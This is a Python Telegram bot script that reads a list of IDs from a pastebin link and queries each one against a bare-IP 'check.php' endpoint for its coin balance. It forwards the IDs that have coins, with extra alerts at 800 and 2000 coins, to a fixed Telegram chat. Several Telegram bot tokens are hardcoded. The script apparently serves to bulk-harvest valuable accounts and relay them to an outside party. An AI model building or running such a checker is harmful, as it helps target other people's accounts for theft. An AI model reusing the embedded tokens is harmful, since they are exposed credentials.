import requests, user_agent, json, flask, telebot, random, os, sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

BOT_TOKEN =  "1132931143:AAGwzukJusNzc5XjSvIMS92X8qLtGo9_Im4"
bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)
@bot.message_handler(content_types=['text'])
def getID(message):
    numCH = 0
    pastebin = (message.text.split("|")[0])
    num = int(message.text.split("|")[1])
    idS = requests.get(str(pastebin)).text.splitlines()
    
    sendM = bot.send_message(message.chat.id, f'-ID : 000000000\nCHECK : {str(numCH)}\nPastebin : {pastebin}')
    while True:
        fil = idS[num]
        bot.edit_message_text(chat_id=message.chat.id, message_id=sendM.message_id,text= f'- ID : {fil}\nCHECK : {str(numCH)}\nPastebin : {pastebin}')
        url = "http://35.181.7.112/check.php?oid={}&submit=submit".format(fil)
   
        smahi = str(requests.get(url=url).text)
        if 'coins":"' in smahi:
            coin = str(smahi.split('coins":"')[1])
            coins = str(coin.split('"')[0])
            requests.get(f'''https://api.telegram.org/bot1111603340:AAHuKvMBE6z5Sk1rQ_jl-yWi12UVcjBU91U/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
            numCH +=1
            num +=1
            if int(coins) > 800 or int(coins) == 800:
                requests.get( f'''https://api.telegram.org/bot1166194091:AAEEDj7xjmgTt3ipvXTycCK44280OJflUaA/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
                if int(coins) > 2000 or int(coins) == 2000:
                    requests.get( f'''https://api.telegram.org/bot5208965780:AAHhLQrfv_7-LybUzRxt3_heQV13JocX0eY/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
        else:
            num += 1
            numCH += 1

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200


if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://telegrambooot.herokuapp.com/" + str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
